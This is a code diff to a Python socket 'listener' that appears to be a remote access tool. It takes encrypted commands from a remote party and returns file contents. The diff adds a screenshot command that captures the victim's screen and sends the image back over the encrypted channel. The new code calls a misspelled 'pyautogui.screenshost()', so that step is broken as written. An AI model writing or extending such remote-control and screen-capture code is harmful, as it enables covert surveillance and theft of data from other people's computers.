@@ -1,5 +1,6 @@
 import os.path
 from time import sleep
+from datetime import datetime
 
 from listener.communication import Communication
 from listener.cipher import Cipher
@@ -7,6 +8,8 @@ from tools.env import EnvReader
 import json
 import platform
 import subprocess
+import pyautogui
+
 
 def main():
     env = EnvReader()
@@ -63,19 +66,35 @@ def main():
                 else:
                     file = open(data['action'], "rb")
                     response = file.read()
-                    # response = json.dumps({
-                    #     'status': 'OK',
-                    #     'response': data
-                    # })
                     file.close()
                 conn.sendall(cipher.encrypt_message(response))
 
+            elif data['type'] == "screenshot":
+                now = datetime.now()
+                date = now.strftime("%d%m_%H%M")
+                filename = f"./screenshot/screen_{date}.png"
 
-            # response = cipher.encrypt_message(f"Commands received: {data['command']}")
-            #conn.sendall(cipher.encrypt_message(response))
-            # if data["commands"] == "download":
+                screenshot = pyautogui.screenshost()
+                screenshot.save(filename)
 
-            # data = None
+                if not os.path.exists(filename):
+                    response = json.dumps({
+                        'status': 'NOK',
+                        'response': 'File not found'
+                    }).encode('utf-8')
+                else:
+                    file = open(filename, "rb")
+                    response = file.read()
+                    file.close()
+                conn.sendall(cipher.encrypt_message(response))
+
+            else:
+                response = json.dumps({
+                    'status': 'NOK',
+                    'response': 'Unknown action'
+                }).encode('utf-8')
+                conn.sendall(cipher.encrypt_message(response))
+
 
 
 if __name__ == '__main__':
